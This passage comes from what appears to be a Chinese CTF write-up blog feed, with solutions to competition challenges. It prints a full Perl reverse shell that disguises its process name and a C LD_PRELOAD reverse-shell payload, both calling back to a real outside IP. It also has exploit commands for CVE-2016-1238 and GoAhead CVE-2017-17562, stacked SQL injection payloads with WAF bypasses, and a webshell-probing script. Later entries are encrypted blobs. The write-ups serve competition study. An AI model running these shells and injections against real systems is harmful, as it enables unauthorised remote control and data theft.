<h3 id="untar">untar</h3>
<p>改自<strong>Hitcon 2017</strong>的<strong>ssrf me</strong>。</p>
<p><strong>CVE-2016-1238</strong>。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line">use strict;</span><br><span class="line">use Socket;</span><br><span class="line">use FileHandle;</span><br><span class="line">use POSIX;</span><br><span class="line">my <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></span><br><span class="line">my <span class="variable">$ip</span> = <span class="string">&#x27;122.51.113.164&#x27;</span>;</span><br><span class="line">my <span class="variable">$port</span> = 2333;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line">my <span class="variable">$daemon</span> = 1;</span><br><span class="line">my <span class="variable">$auth</span>   = 0; <span class="comment"># 0 means authentication is disabled and any </span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line">my <span class="variable">$authorised_client_pattern</span> = qr(^127\.0\.0\.1$);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declarations</span></span><br><span class="line">my <span class="variable">$global_page</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">my <span class="variable">$fake_process_name</span> = <span class="string">&quot;/usr/sbin/apache&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="variable">$0</span> = <span class="string">&quot;[httpd]&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="keyword">if</span> (defined(<span class="variable">$ENV</span>&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125;)) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Browser IP address appears to be: <span class="variable">$ENV</span>&#123;&#x27;REMOTE_ADDR&#x27;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line">        unless (<span class="variable">$ENV</span>&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125; =~ <span class="variable">$authorised_client_pattern</span>) &#123;</span><br><span class="line">            cgiprint(<span class="string">&quot;ERROR: Your client isn&#x27;t authorised to view this page&quot;</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; elsif (<span class="variable">$auth</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;ERROR: Authentication is enabled, but I couldn&#x27;t determine your IP address. Denying access&quot;</span>);</span><br><span class="line">    cgiexit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$daemon</span>) &#123;</span><br><span class="line">    my <span class="variable">$pid</span> = fork();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">        cgiexit(0); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="built_in">chdir</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="built_in">umask</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line">socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname(<span class="string">&#x27;tcp&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (connect(SOCK, sockaddr_in(<span class="variable">$port</span>,inet_aton(<span class="variable">$ip</span>)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Sent reverse shell to <span class="variable">$ip</span>:<span class="variable">$port</span>&quot;</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Couldn&#x27;t open reverse shell to <span class="variable">$ip</span>:<span class="variable">$port</span>: $!&quot;</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line">open(STDIN, <span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line">open(STDOUT,<span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line">open(STDERR,<span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line"><span class="variable">$ENV</span>&#123;<span class="string">&#x27;HISTFILE&#x27;</span>&#125; = <span class="string">&#x27;/dev/null&#x27;</span>;</span><br><span class="line">system(<span class="string">&quot;w;uname -a;id;pwd&quot;</span>);</span><br><span class="line"><span class="built_in">exec</span>(&#123;<span class="string">&quot;/bin/sh&quot;</span>&#125; (<span class="variable">$fake_process_name</span>, <span class="string">&quot;-i&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line">sub cgiprint &#123;</span><br><span class="line">    my <span class="variable">$line</span> = <span class="built_in">shift</span>;</span><br><span class="line">    <span class="variable">$line</span> .= <span class="string">&quot;&lt;p&gt;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$global_page</span> .= <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line">sub cgiexit &#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="built_in">exit</span> 0; <span class="comment"># 0 to ensure we don&#x27;t give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line">sub cgiprintpage &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Content-Length: &quot;</span> . length(<span class="variable">$global_page</span>) . <span class="string">&quot;\r Connection: close\r Content-Type: text\/html\r\n\r\n&quot;</span> . <span class="variable">$global_page</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://183.129.189.62:18307/?url=http://122.51.113.164/south.perl&amp;filename=URI/south.pm</span><br></pre></td></tr></table></figure>
<p>在自己的<strong>VPS</strong>上上个302跳转就行了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: south://122.51.113.164&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://183.129.189.62:18307/?url=http://122.51.113.164/&amp;filename=south</span><br></pre></td></tr></table></figure>
<p>收到反弹<strong>shell</strong>。</p>
<h4 id="thinkphp">thinkphp？</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="crypto">Crypto</h3>
<h4 id="give-me-your-passport">give me your passport</h4>
<p>直接本地修改<strong>name = "Admin"</strong>，然后提交给服务器。</p>
<h4 id="rsa">rsa</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getd</span>(<span class="params">n, e, dp</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) / i) + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">                p = ((dp * e - <span class="number">1</span>) / i) + <span class="number">1</span></span><br><span class="line">                q = n / (((dp * e - <span class="number">1</span>) / i) + <span class="number">1</span>)</span><br><span class="line">                phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                d = gmpy2.invert(e, phi) % phi</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dp = <span class="number">84373069210173690047629226878686144017052129353931011112880892379361035492516066159394115482289291025932915787077633999791002846189004408043685986856359812230222233165493645074459765748901898518115384084258143483508823079115319711227124403284267559950883054402576935436305927705016459382628196407373896831725</span></span><br><span class="line">n = <span class="number">22000596569856085362623019573995240143720890380678581299411213688857584612953014122879995808816872221032805734151343458921719334360194024890377075521680399678533655114261000716106870610083356478621445541840124447459943322577740268407217950081217130055057926816065068275999620502766866379465521042298370686053823448099778572878765782711260673185703889168702746195779250373642505375725925213796848495518878490786035363094086520257020021547827073768598600151928787434153003675096254792245014217044607440890694190989162318846104385311646123343795149489946251221774030484424581846841141819601874562109228016707364220840611</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">14874271064669918581178066047207495551570421575260298116038863877424499500626920855863261194264169850678206604144314318171829367575688726593323863145664241189167820996601561389159819873734368810449011761054668595565217970516125181240869998009561140277444653698278073509852288720276008438965069627886972839146199102497874818473454932012374251932864118784065064885987416408142362577322906063320726241313252172382519793691513360909796645028353257317044086708114163313328952830378067342164675055195428728335222242094290731292113709866489975077052604333805889421889967835433026770417624703011718120347415460385182429795735</span></span><br><span class="line"></span><br><span class="line">d = getd(n, e, dp)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span> (binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
<h3 id="创新方向">创新方向</h3>
<h4 id="大数据安全">大数据安全</h4>
<p><strong>GoAhead CVE-2017-17562</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line">static void before_main(void) &#123;</span><br><span class="line">    int sock = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    struct sockaddr_in attacker_addr = &#123;0&#125;;</span><br><span class="line">    attacker_addr.sin_family = AF_INET;</span><br><span class="line">    attacker_addr.sin_port = htons(2333);</span><br><span class="line">    attacker_addr.sin_addr.s_addr = inet_addr(&quot;122.51.113.164&quot;);</span><br><span class="line">    if(connect(sock, (struct sockaddr *)&amp;attacker_addr,sizeof(attacker_addr))!=0)</span><br><span class="line">    exit(0);</span><br><span class="line">    dup2(sock, 0);</span><br><span class="line">    dup2(sock, 1);</span><br><span class="line">    dup2(sock, 2);</span><br><span class="line">    execve(&quot;/bin/sh&quot;, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @south.so http://183.129.189.62:15800/cgi-bin/index\?LD_PRELOAD\=/proc/self/fd/0 -i | head</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 强网杯 线上预选赛 部分题解</title>
    <url>/2019-QWB-Preliminary/</url>
    <content><![CDATA[<p>赛后复现一下<strong>Orz</strong>。</p>
<span id="more"></span>
<h4 id="随便注">随便注</h4>
<p><strong>?inject=1' order by 3 --+</strong>判断出只有两列。</p>
<p>使用<strong>?inject=1' union select 1,2
--+</strong>的时候弹出了<strong>waf</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
<p>测试发现可以使用堆叠注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?inject=1&#x27;;show tables --+</span><br></pre></td></tr></table></figure>
<p>得到两个表，<strong>1919810931114514</strong>和<strong>words</strong>。</p>
<p>这儿接下来是有两个操作。</p>
<h5 id="chamd5的师傅的"><a
href="https://cloud.tencent.com/developer/article/1441484">Chamd5的师傅的</a></h5>
<p>使用预编译来绕过注入。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">create procedure vk()</span></span><br><span class="line"><span class="string">begin</span></span><br><span class="line"><span class="string">  set @v_sql=concat(&#x27;</span>sel<span class="string">&#x27;,&#x27;</span>ect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">  prepare stmt from @v_sql;</span></span><br><span class="line"><span class="string">  execute stmt;</span></span><br><span class="line"><span class="string">  deallocate prepare stmt;</span></span><br><span class="line"><span class="string">end;</span></span><br><span class="line"><span class="string">call vk();--+</span></span><br></pre></td></tr></table></figure>
<p>然后又弹出了一个<strong>waf</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</span><br></pre></td></tr></table></figure>
<p>这个好办，<strong>strstr</strong>大小写敏感，直接大小写绕过。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">CREATE PROCEDURE VK()</span></span><br><span class="line"><span class="string">BEGIN</span></span><br><span class="line"><span class="string">  SET @V_SQL=CONCAT(&#x27;</span>SEL<span class="string">&#x27;,&#x27;</span>ECT <span class="operator">*</span> <span class="keyword">FROM</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">  PREPARE STMT FROM @V_SQL;</span></span><br><span class="line"><span class="string">  EXECUTE STMT;</span></span><br><span class="line"><span class="string">  DEALLOCATE PREPARE STMT;</span></span><br><span class="line"><span class="string">END;</span></span><br><span class="line"><span class="string">CALL VK();--+</span></span><br></pre></td></tr></table></figure>
<h5 id="shad0w_zz师傅的"><a
href="https://www.jianshu.com/p/595d3f1b3596">Shad0w_zz师傅的</a></h5>
<p>具体思路是修改<strong>1919810931114514</strong>的表名为<strong>words</strong>。</p>
<p>先给表加个<strong>id</strong>字段。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">ALTER TABLE `1919810931114514` ADD `id` INT(1) NOT NULL DEFAULT &#x27;</span><span class="number">1</span><span class="string">&#x27; AFTER `flag`;--+</span></span><br></pre></td></tr></table></figure>
<p>然后改名。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?inject<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">ALTER TABLE `1919810931114514` RENAME TO `xxx`;</span></span><br><span class="line"><span class="string">ALTER TABLE `words` RENAME TO `zzz`;</span></span><br><span class="line"><span class="string">ALTER TABLE `xxx` RENAME TO `words`;--+</span></span><br></pre></td></tr></table></figure>
<h4 id="高明的黑客">高明的黑客</h4>
<p>源码在<strong>www.tar.gz</strong>中，共计<strong>3002</strong>个文件。</p>
<p>具体思路是遍历找出所有的<strong>Shell</strong>来尝试连接。</p>
<p>抄一下<a
href="https://mochazz.github.io/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><strong>Mochazz</strong></a>师傅的脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">&#x27;/var/www/html/src&#x27;</span>)</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;\$_[GEPOST]&#123;3,4&#125;\[.*?\]&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/var/www/html/src/&#x27;</span>+name,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = <span class="built_in">list</span>(<span class="built_in">set</span>(pattern.findall(data)))</span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="string">&#x27;uname&#x27;</span></span><br><span class="line">            flag = <span class="string">&#x27;Linux&#x27;</span></span><br><span class="line">            <span class="comment"># command = &#x27;phpinfo();&#x27;</span></span><br><span class="line">            <span class="comment"># flag = &#x27;phpinfo&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;GET&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r&quot;&#x27;(.*)&#x27;&quot;</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.get(url=<span class="string">&#x27;http://127.0.0.1:8888/&#x27;</span> + name + <span class="string">&#x27;?&#x27;</span> + passwd + <span class="string">&#x27;=&#x27;</span>+ command)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;backdoor file is: &#x27;</span> + name)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;GET:  &#x27;</span> + passwd)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;POST&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r&quot;&#x27;(.*)&#x27;&quot;</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.post(url=<span class="string">&#x27;http://127.0.0.1:8888/&#x27;</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;backdoor file is: &#x27;</span> + name)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;POST:  &#x27;</span> + passwd)</span><br><span class="line">        <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><strong>emmm</strong>本地测试的时候需要将<strong>PHP</strong>版本改为<strong>7.3</strong>左右。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backdoor file is: xk0SzyKwfzw.php GET:  Efa5BVG</span><br></pre></td></tr></table></figure>
<p>连接上。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;us4882vyom353basexu6ai7c0i66gfag&#125; </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 SUCTF 部分题解</title>
    <url>/2019-SUCTF/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e90c2b3b84a82f81dd9867715f37f64b9d3ddb9e8a0333034142befc093c285e">7e2e5d8e84a6dbe261d42399a5b5d367f46d23bea2d60dbc57c431ca729240b9dc72ab6da0a745dbc769b8b26abcbccc97c0e2255f001fa1bc35b4a7179037ce5221f36316bedd4133fd5145c462328be960388e1dadaa38136038388880c01c3f7acde2c31740d91cee1eb13c93b75dfe9d7e29ad4203d6403150bf5a795089c1ee17d0ee41f898ec09bf48f79baa83587b81875de4c7bb213fddfcc2f808352051be1d4af4cc249055054e8fd845614bb0a91c95bb26f6c979736feff18411883b197b4585a01e57be470d776fffec4f1b470422479920f5d90b93bedd8a7c3d8eb01d530b0d1d7fc676fc3e34f619f6b761f824036be8fd2d3a33d67d7bec59c06e6e0ec3caadce91673d15de3d53d48fecd0b1d53a84b1462508ac633ef3870d7fd605f7876265706f8845000e9455768b71aaced30b9dd550397d15fee45b11bd7db7747967b3a531f5c2d35a0f940539260b82bfd414519d54a06d04a07e9587c951f8de2f4c54b6ce6b7d048261adcb869e0a58aca13acb5ca86338ad20cca520d638229cf647fdbca4d003387c1fba6e04e480a1c85f963c13c3353c8fca743fa1f5b8f78495a43e589333f5177490b7c671518a35b0793a2aaeafc5d29d6ecdd463cecaa92dc8e5cdc078355e1079327d18b5959c1a4f4a1579124bf1465fb2ad069bdf51f3a7b9952a4217387aba05ef19ece2bbc9e297593a6b8bd5edb50e611d113ee10a8143ef4495b193f7ae860bfb2a4a833f25d4e69d22dc2a061309103dd50175cbd93f5baec6b47271cdb89b251ba2548f8b57a2bc500b92dddb181c53e8faa93d75c79cdc97f44b7db8cdb3c8327f4fb22c2b26bdc3c00f6ad65273aab6d64e038b4ba5f352fc4eac0f31fbff706556369e57de07a420c385c296986085c18f9f6b20e6f88ad045efb1b9542c417c824b6ef33a536e526c3bc9925aea30728d5b54ea0a4135b0c12e3fbef04ac7997ae72176caac499214ce0cb5e299706d021f5ad47e04614e09319837d4153ea052d7aeada08a181988db666bfd4381af9484db3f95af24748751ef9daf458a4a0766376bb38e62da1d545c82a1b386c21ccfb82a2f8e31a9d8f255d8c1e1e9b1ae561923b7971618ae9b618c19a258f501b30cb3dacd1c64bb8a8db88ea5057c0db74e2d6dd2f711c2f9a85e65cea7a3706b9ed28d8398315bbca5d667fce221e978e719dcaca4128f5b7bfecdcb5329c4d9afa6f450c83ab8992c3851ad728189494e7694176c2fbabf9f07b14ad9706c31756a95aaa30a279b1894cb70f538f02e906cbad3a766db346534ba20b834f7cd2e085034b5199200433ef92bfafa70a39edd736b5a8854258c55926dd2da245ec7dc2821198f15a3a1f631bde4e962872f6049d6654fd392e47dc7bee0c6f43982f9729b1eece3cd7342ac4309a3e79617eea103d1c021873cc936812852c694b0f74d47fbf9df25948bdaf99edfc80a2fa325de314bc0c748cdea0a5fa9ffcdc5b0ffd9cbc746470a1ab5f963f031bd47f048fa6517824a3cb7432d3a8a158ddd78f62fa7152fa653670715210d96ed83eb5c1a9c5dfa080bb9fcda4f81d5bd92df37840451cf90968cc5a55fbdd921ebfb157b7ab5c61b3c926d284a400d748704cdf300eaf32f808686b3cecfe2b4b0281baaf1094640b390e029bda5efc6e56b5178a96a09d102c71ece1c9a5cfe635d4f88925f176a44ae464b451085a326b651322aa3164075c1805d142f2cfa2dc3b0fb1cd4838b0be1c31c7365670cc7d8d25c36765c0a3876cdd139b6d42f55ccb9cd0a0de1ecc9edf1cafdc4fd44b03567940f6c97088477503ddcc6d0eaf7c071c6c1a5e04e4ceeeab2970dbf4632ee8f4fb1cb6a80ea955cd243dedd49bad1507688f0b58bbee55bfec5fa0f0a936d45e6cd4850c804288f9582616d9deae908ea2d68932e441f08d7ccd3d7c61b0acff467549dada68f99f4b806268ecf3c129454eb93007213b2fd1d6868816249f749772d81603a97831400dee62588e364cf925c2f9dbab0cbef8fbfe33f07a9be0de8e80c20034b164ed15d489a70b76bad39594bd8f83035e4218d6c6f90fd5adf674ec227600e6996ad62f073cb6585988417c1a048c88cb1ff811ee343d604ec8e7fac431268b2cbb81e5dd8da0bdb9fcf7139341f25f24add14c7337883192867db06b55a0901c23299ce765d253f08b480b9edc49b76cd94737e84e946314df86de4b48a5d930c0733082fb68b94918caae51f6b9355ef61392d6832b16276331a630726c671a9dd55d40e2a1412848cb50b2fa5637f4cabc35513d27dda0793078f774c8bcb12de7eabf15d76b97280214cc1df79150f4285e7b404b3a50958938e3029823349bcfdec62110f5f5336fd02185d83465d03d072d4beb5de2c96bd620aac128844ab3d7fbf7cc152fad484dbbfde2eb532cc7daa6a109aa13de748c04a8ca474b33fa284506ace48e2754088d7c0b97adaf9fc5d679bad25b1c310c53dde6fe3d53a6ca26daccfb0eca8b742b228cbed86ecf44baf7b51339629667b326f64bbcf5e892e58d56abe95679d3bb991c4e5ec34eb3777485a5e50fd9b7725decac998b78fb1e9142ff0157edf169340511bac39e2cbc9b4317c3ff0e98d6450ae85e1832443ff95c3f35ea2c7c75ad2ecffd86df4d1c4b40f20dea71ab6c1f915405a1748e0cd97fb2bc2839a8564c71b71f88359c98d4346ca81cd09a5118df92cc027f5b9cbbc30bb6c97a44826fcebb43c48215a37e2051b82aad2418de7e7730f45000c27cdc03b68eec5575b5e9322396ec6319104e91b048420528a18ce2ebe1888338dca7999a0d2d1e201555ca4103167907aed7e366fa14cb5550db203d97fd9e1cbbd0a2ae7c1c30a78cc6c9d43b65e6eb2d3f6e768507950858e6d9d21ddda64840970f471c3fb4dc06e8a4a7ad4f00b5e6435771df4c18336048b730508a3f2533a5c5bd2aad8a3521d0bbc57175c292e5b7742014880a117c5287604ba7902f784bead8436cea65287b3228bce6a9d848fb98bd3ad76a827e9ad48195663422ce508967079ce8f2a793f965ec752431c4cd11062fe52969e9d10b8f12d09389413d82e2b412a1511cd0bde3b3f7a82c1c67cda2e8fc42b94093d2f2daca61db47cd53f04c23eda44c44f3f3aa3f75ba2d754ecc39235caef9547fc82f6c50a6c427350982b32d0ad18a501ac9a65ff343dafcc87d427305c0ed1ac3587dc5a597132efd46f68c63791f164d01d0effd6649277f403576871fa01076ea35979139a19f9f2ddb30924e18c3253b32af0019b1a6eaf44bb0cbfa741206b53ebb18efcad6c029e1b9beddc1f24022f7fb56603cebac7139aa6708d8a2b114c901691a5b75552851d7a5526593406f97d9b3e730fa05c4908afbae0389eec9d7e27b4b9af7a342eb81b493a6f9ed8c766fd02b91e6cd8b2b0028f679ae7fc9865b392b20af6f84ee36252b85a205a83d15d2b3941228415a1d9a7c1a74d0765155aa4cb0ccf405bd55da0df7ecfaeb121106d00918f230e6c1d7d209b963a111fb503e90c8466a468cadc16bae76a8a782c201cb5f6adf59cb5815f6cb5d924d2fa598d956e3564ae146a4496fd64c4c9795d34c1d563cb6df4775bae649d9f3197e98de8a515adbf0f5065e6fe1e4bb9204ad26df26a41bf120305bd3e8731bf1a0a631a65f0da3d57d8016ee96ada7bb42f077beeef4764b948c364494d428a5dfd90f87784c9c52b1155e0e88874d656e87ac27c73fed76c57957d0f2af8fd22772144dc6c860f7604a2d94dd9feb841b145d8568e92db101f8010db3b3362f954611b85d3af5e1b42b1cfcdb63df70da2f953bd36330a6b3e827e2ee038b023f85efb6008b772ee2c5bd07a63b7c3e8868a87caa84a93e96841dd2a2c6389d107a737c39be888e54e7d9b6cd713bd88cdc9788b231fc67339f7c19d84b34b3e2b8546efa70e361b00e3083e1b752a25028d8765594e65f3d4e13ae977bdc9c6cd28497016b6149c18579ae15aac13a4a0bcbc4dd0fd67a735e230026f00b484d1e879a761de11b03e023b566eb3a3a54680b1aa17cd5b23defd2061b8bfe6628dba34959e0f3ac8e27307107d76bfeb2786c55ad470cf519086fae4bd17793bee7b3c67fa5b4bf01b0954475998fcc7ba679f5bc8ba31f0ff7fbe846684a2381a11b4d13cf3a2978f785b76a3deb9c2b485c530a942b60f6a2edffd5c29108f2e76052202218acefb00fdc326dbd63dba2cbe96c4e6144755edfff58b9270b44f182ac74b78094aeef8e2d4e0d0ea787de46bc7da1dca8f9c55aabb3696b5f7ffb8b423c3d9ac62e29b141a5d066df26252fe2a1fff6c73815570023385c188a4f412d098fb3203291aa18b3facd8a2c7b671582959c8cd035946ab351ec59f1360ca56f15e5dc049aaff0b64359200150ff1b4d07ec265ca07741c98b88192617d4c8c892bccd743c3452582c132d0cce87b1ad76c9ef55d7f16955a87c875ab26234f7c169d161fa8a0ab9633da98145d837bea8832a11a3e12e1f964f288c06787f247e1e6518b65bd0205b577e93953910aa8a1b84d3815c3ecd63a4c8ff6e3235965944830cf76c981e8507f04a1e5e7b5ceda1c1603394b2266b1f50bcd9cc105e5aa1f</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 XCTF Final 部分题解</title>
    <url>/2019-XCTF-Final/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
